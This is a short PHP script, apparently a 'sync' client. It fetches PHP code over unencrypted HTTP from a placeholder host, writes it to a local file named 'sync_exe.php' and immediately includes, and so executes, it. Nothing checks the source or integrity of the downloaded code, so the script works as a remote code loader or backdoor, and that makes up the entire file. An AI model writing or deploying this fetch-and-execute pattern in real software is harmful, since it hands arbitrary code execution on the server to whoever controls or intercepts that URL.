<?php

$url="http://xxx.xxx/sync/client.php";
$html = file_get_contents($url); 

if ($html === FALSE)
{
	exit("NET ERROR!");
}

file_put_contents("sync_exe.php", $html);
include "sync_exe.php";